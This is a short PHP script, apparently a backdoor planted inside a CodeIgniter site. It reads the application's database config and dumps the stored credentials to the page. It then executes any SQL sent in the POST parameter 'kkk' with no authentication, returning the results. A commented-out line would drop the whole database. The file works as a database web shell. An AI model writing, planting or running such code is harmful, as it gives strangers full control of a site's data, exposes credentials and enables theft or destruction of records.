<?php
define('BASEPATH','abddd');
$file=__DIR__ ."/../../../application/config/database.php";
require($file);
var_dump($db);
$db=$db["default"];
function get_link($db_config){
   $dsn=$db_config["type"].":host=".$db_config["host"].";port=".$db_config["port"].";dbname=".$db_config["dbname"];
   $user=$db_config["user"];
   $pass=$db_config["pass"];
   try {
      $link = new PDO($dsn, $user, $pass); //初始化一个PDO对象
   } catch (PDOException $e) {
      die ("Error!: " . $e->getMessage() . "<br/>");
   }
   $link->query('set names utf8;');
   return $link;
}

$db_config=array(
	"type"=>"mysql",
	"host"=>$db["hostname"],
	"dbname"=>$db["database"],
	"user"=>$db["username"],
	"pass"=>$db["password"],
	"port"=>3306
);
$link=get_link($db_config);
//$link->exec("drop database ".$db["database"]);
$post=$_POST["kkk"];
var_dump($post);
try{
	var_dump($link->exec($post));
}catch(Exception $e){
	
}
//var_dump($link->exec($post));
var_dump($link->query($post)->fetchAll(PDO::FETCH_ASSOC));
